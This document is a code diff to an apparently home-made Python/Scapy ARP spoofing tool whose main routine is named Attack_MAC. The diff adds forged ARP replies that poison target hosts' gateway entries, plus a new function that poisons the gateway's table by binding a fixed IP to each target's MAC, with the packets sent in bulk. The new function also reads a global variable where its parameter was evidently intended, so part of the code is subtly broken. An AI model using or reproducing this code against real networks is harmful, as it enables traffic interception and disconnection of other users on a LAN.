@@ -104,10 +104,23 @@ def GeneratePacket_1(PackNum,TargtMAC):
     PKT = []
     for targtmac in TargtMAC:
         targtIP = GetIpByMac(targtmac)
-        if targtIP is not None:
+        if targtIP != None:
             Temp_mac = GetForgedMac(MY_mac,PackNum)
             PKT_ = Ether(dst=targtmac)/ARP(op=1,psrc=GW_ip,hwsrc=Temp_mac,pdst=targtIP,hwdst=targtmac)
             PKT.append(PKT_)
+            PKT_ = Ether(dst=targtmac)/ARP(op=2,psrc=GW_ip,hwsrc=Temp_mac,pdst=targtIP,hwdst=targtmac)
+            PKT.append(PKT_)
+    return PKT
+def GeneratePacket_2(PackNum,TargetMac,FloatIP):
+    PKT=[]
+    for targtmac in TargtMAC:
+        targtIP = GetIpByMac(targtmac)
+        if targtIP != None:
+            PKT_ = Ether(src=targtmac,dst=GW_mac)/ARP(op=1,psrc=FloatIP,hwsrc=targtmac,pdst=GW_ip,hwdst=GW_mac)
+            PKT.append(PKT_)
+            PKT_ = Ether(src=targtmac,dst=GW_mac)/ARP(op=2,psrc=FloatIP,hwsrc=targtmac,pdst=GW_ip,hwdst=GW_mac)
+            PKT.append(PKT_)
+    PKT=PKT*PackNum
     return PKT
 def SendPacket(PKT=[],Counter=1,Interval=1,Debug=True):
     if len(PKT) is 0:
@@ -135,8 +148,9 @@ def Attack_MAC(Face,GWIP,MAC,PackNum,Counter,Interval):
     GetOurInf(Face,Debug = True)
     GetLanInf(GWIP="192.168.0.1",Debug=True)
     GetAllHostInf()
-    PKT=GeneratePacket_1(PackNum,MAC)
-    SendPacket(PKT,Counter,Interval)
+    PKT1=GeneratePacket_1(PackNum,MAC)
+    PKT2=GeneratePacket_2(PackNum,MAC,"192.168.0.130")
+    SendPacket(PKT1+PKT2,Counter,Interval)
     return 
     
 def EnsureWifiConnection(GWIP="192.168.0.1",Interface="eth0",Delay=2):
@@ -154,7 +168,9 @@ def EnsureWifiConnection(GWIP="192.168.0.1",Interface="eth0",Delay=2):
     
 def IsWifiWorkWell(GWIP = "192.168.0.1"):
     res = GetMac(GWIP)
-    if res is None or res is "ff:ff:ff:ff:ff:ff":return False
+    if res == None:return False
+    if res == "ff:ff:ff:ff:ff:ff":return False
+    if res == "00:00:00:00:00:00":return False
     else:return True
 
 if __name__ == "__main__":
